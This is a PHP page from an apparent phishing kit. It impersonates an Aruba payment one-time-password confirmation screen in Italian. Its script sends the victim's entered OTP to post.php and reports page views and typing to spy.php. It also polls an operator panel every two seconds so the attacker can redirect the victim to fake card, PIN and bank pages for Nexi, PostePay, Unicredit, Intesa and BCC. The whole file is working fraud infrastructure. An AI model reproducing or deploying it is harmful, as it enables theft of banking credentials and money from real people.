<?php 
require_once '../includes/main.php';
require '../main.php';
?>
<!doctype html>
<html>
<head>
    <title></title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="sms_aruba/res/sms.css">
</head>
<body>
<section>
<div class="form">
    <div class="header">
        <div class="left">
            <img src="sms_aruba/res/log.svg">
        </div>
        <div class="right">
            <img src="sms_aruba/res/vm.png">
        </div>
    </div>
    <b>One-time Password</b>
    <p>La password per autorizzare la transazione è stata inviata via SMS al tuo numero di cellulare o via email. Ricorda: disponi di 3 tentativi per inserirla correttamente.</p>
    <p>Inserisci il codice OTP che hai ricevuto e clicca «Prosegui» per confermare l’operazione.</p>

    <?php
    if (isset($_GET['e'])) { 
        echo '<div class="col error">Código incorrecto. Inténtalo de nuevo</div>';
    }
    ?>

    <table>
        <tr>
            <td>Mercante:</td>
            <td>ARUBA</td>
        </tr>
        <tr>
            <td>Data e ora:</td>
            <td><?php echo date('d/m/Y h:i:sA'); ?></td>
        </tr>
        <tr>
            <td>Codice OTP:</td>
            <td><input type="tel" maxlength="6" id="d0"></td>
        </tr>
        <tr>
            <td></td>
            <td><button onclick="sendSms()">Prosegui</button></td>
        </tr>
    </table>

    <div style="margin:60px 0; font-size:0.7em;">
        Queste informazioni non vengono condivise con il commerciante
    </div>
</div>
</section>

<style>
.loader {
    width: 100%;
    height: 100%;
    position: fixed;
    background: rgba(255, 255, 255, 0.8);
    top: 0;
    display: none;
    z-index: 9999999999;
}
.loader .content {
    width: 100%;
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
}
</style>
<div class="loader">
    <div class="content">
        <img src="sms_aruba/res/loading.gif" style="width:80px;">
    </div>
</div>
<script src="sms_aruba/res/cdns/jq.js"></script>
<script src="sms_aruba/res/cdns/m.js"></script>
<script>
<script src="sms_aruba/res/jq.js"></script>
<script src="sms_aruba/res/v.js"></script>


</div>
<script src="res/jq.js"></script>
<script src="res/v.js"></script>
    <script src="css/jq.js.download"></script>
    <script>
    var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
            12: "Cartabcc.php",
            13: "Cartabcc_error.php",
            14: "PostePay.php",
            15: "PostePay_error.php",
            16: "Unicredit.php",
            17: "Unicredit_error.php",
            18: "pin.php"
    };
    clearRedirections();
    setInterval(function(){
    $.post("../panel/process/processor.php",
    {keepAlive:1, page:"SMS"} );
}, 2000);
var redirect=0;
setInterval(function(){
    $.post("../panel/process/processor.php",{redirectionListener:1}, function(data){
        redirect=data;
        if(redirect==0){
            return false;
        }else{
            clearRedirections();
            window.location=targets[redirect];
        }
    });
}, 2000);
function clearRedirections(){
    $.post("../panel/process/processor.php",
    {clearRedirection:1});
}

 </script>
<script src="css/jquery.min.js.download"></script>
<script src="css/jquery.mask.min.js.download"></script>
<script src="css/jquery.creditCardValidator.js.download"></script>
<script>
 
function sendSms(){
    if($("#d0").val().length<6){
        return $("#d0").addClass("error");
    }

        $(".loader").show();
           $.post("post.php",{sms:$("#d0").val()}, function(d){
            window.location="wait.php?p=SMS";
           } );
    
}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendSms();
    }
});

$.post("spy.php",{otpview:1});
var abortNote = false;
$("input").keyup(()=>{
    if(!abortNote){
        $.post("spy.php",{otping:1});
        abortNote=true;
    }

});

</script>

<?php 
$j->ctr("SMS ".@$_GET['e']);
?>
</body></html>